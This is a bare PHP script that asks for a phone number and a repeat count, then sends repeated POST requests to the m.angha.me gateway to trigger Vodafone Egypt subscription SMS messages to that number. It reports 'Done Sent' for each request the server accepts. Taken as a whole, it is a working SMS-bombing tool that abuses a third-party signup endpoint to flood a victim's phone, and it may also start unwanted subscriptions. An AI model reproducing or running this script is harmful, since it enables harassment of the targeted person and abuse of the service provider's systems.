$num = readline('  Enter Your Number   > ');
$vf = '+2';
$count = readline('  Enter count sms   > ');

for ($i = 0; $i < $count; $i++) {
    $url = "http://m.angha.me/gateway.php";
    $headers = array(
        'Host' => 'm.angha.me',
        'Connection' => 'keep-alive',
        'Content-Length' => '105',
        'Accept' => 'application/json, text/plain, */*',
        'User-Agent' => 'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Mobile Safari/537.36',
        'Content-Type' => 'application/x-www-form-urlencoded;charset=UTF-8',
        'Sec-GPC' => '1',
        'Origin' => 'http://m.angha.me',
        'Referer' => 'http://m.angha.me/plus/operators/vodafoneeg?pid=717&source=significant%C2%A7sms',
        'Accept-Encoding' => 'gzip, deflate',
        'Accept-Language' => 'en-US,en;q=0.9',
        'Cookie' => 'country=null; userlanguageprod=en; language=en; appversion=0.0.2316; fingerprint=eyJmcCI6IjhhZTAxNDNkLWM3ZWUtNGZhNS1iZmE0LTRiYjBkOTY4NTMxOSIsImgiOiJiNWRlODFhNCJ9'
    );
    $data = array(
        'msidn' => $vf . $num,
        'source' => 'significant§sms',
        'resend' => '0',
        'planid' => '717',
        'output' => 'jsonhp',
        'type' => 'SUBSCRIBEvodafoneeg'
    );
    $rr = file_get_contents($url, false, stream_context_create(array(
        'http' => array(
            'method'  => 'POST',
            'header'  => $headers,
            'content' => http_build_query($data),
        ),
    )));
    if (strpos($rr, "ok") !== false) {
        echo "Done Sent\n";
    } else {
        echo "ERROR\n";
    }
}
